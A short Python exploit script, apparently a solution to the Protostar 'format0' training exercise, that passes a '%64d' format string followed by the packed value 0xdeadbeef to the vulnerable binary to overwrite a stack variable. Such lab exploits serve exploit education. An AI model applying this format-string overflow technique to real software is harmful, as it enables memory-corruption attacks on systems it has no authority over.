#!/usr/bin/env python
import struct
import subprocess

path = "/opt/protostar/bin/format0"
var = struct.pack("<I", 0xdeadbeef)
offset = "%64d"
#print offset + var

args = [path, offset+var]

process = subprocess.Popen(args, stdin=subprocess.PIPE)
